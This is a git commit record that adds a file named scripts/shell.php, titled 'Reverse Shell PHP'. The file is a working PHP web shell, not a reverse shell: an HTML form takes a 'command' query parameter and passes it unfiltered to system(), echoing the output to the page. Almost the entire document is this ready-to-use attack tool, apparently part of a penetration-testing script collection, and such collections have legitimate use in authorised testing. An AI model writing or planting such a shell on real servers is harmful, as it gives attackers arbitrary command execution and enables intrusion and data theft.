c8dc77cbc5eb0fc3612af1c396e665a404f6dcb6
RedHatRanger <90477448+RedHatRanger@users.noreply.github.com>
2024-12-27 21:12:37 -0600

    Create shell.php

---
+++ scripts/shell.php
@@ -0,0 +1,17 @@
+# Reverse Shell PHP
+<html>
+<body>
+<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+<input type="text" name="command" autofocus id="command" size="50">
+<input type="submit" value="Execute">
+</form>
+<pre>
+<?php
+    if(isset($_GET['command'])) 
+    {
+        system($_GET['command'] . ' 2>&1'); 
+    }
+?>
+</pre>
+</body>
+</html>
